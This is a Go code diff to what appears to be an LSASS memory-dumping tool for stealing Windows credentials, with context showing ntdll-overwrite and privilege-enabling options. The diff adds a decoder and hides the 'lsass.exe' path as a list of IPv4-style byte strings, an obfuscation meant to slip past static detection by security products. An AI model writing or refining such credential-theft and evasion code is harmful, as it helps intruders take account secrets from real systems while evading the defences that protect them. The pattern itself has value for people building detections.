@@ -7,6 +7,8 @@ import (
     "flag"
     "unsafe"
     "syscall"
+    "strings"
+    "strconv"
     "math/big"
     "github.com/alexmullins/zip" //"archive/zip"
     "crypto/rand"
@@ -639,6 +641,21 @@ func writeJson(json_file string, mem64list_arr []Mem64Information) {
 }
 
 
+func decodeIPV4(byteStrings []string) (string) {
+    var byteArray []byte
+    for _, byteString := range byteStrings {
+        parts := strings.Split(byteString, ".")
+        for _, part := range parts {
+            b, _ := strconv.Atoi(part)
+            byteArray = append(byteArray, byte(b))
+        }
+    }
+    result := string(byteArray)
+    result = strings.Trim(result, "\x00")
+    return result
+}
+
+
 func main() {
     // Ntdll overwrite options
     var optionFlagStr string
@@ -660,8 +677,11 @@ func main() {
     }
     fmt.Printf("[+] Privilege Enabled:\t%t\n", priv_enabled)
 
+    // Decode process name to "C:\\WINDOWS\\system32\\lsass.exe"
+    process_name_ipv4_encoded := []string{"67.58.92.87", "73.78.68.79", "87.83.92.115", "121.115.116.101", "109.51.50.92", "108.115.97.115", "115.46.101.120", "101.0.0.0"}
+    process_name := decodeIPV4(process_name_ipv4_encoded)
+    
     // Get process handle
-    process_name := "C:\\WINDOWS\\system32\\lsass.exe"
     proc_handle := GetProcessByName(process_name)
     fmt.Printf("[+] Process Handle: \t%d\n", proc_handle)
 
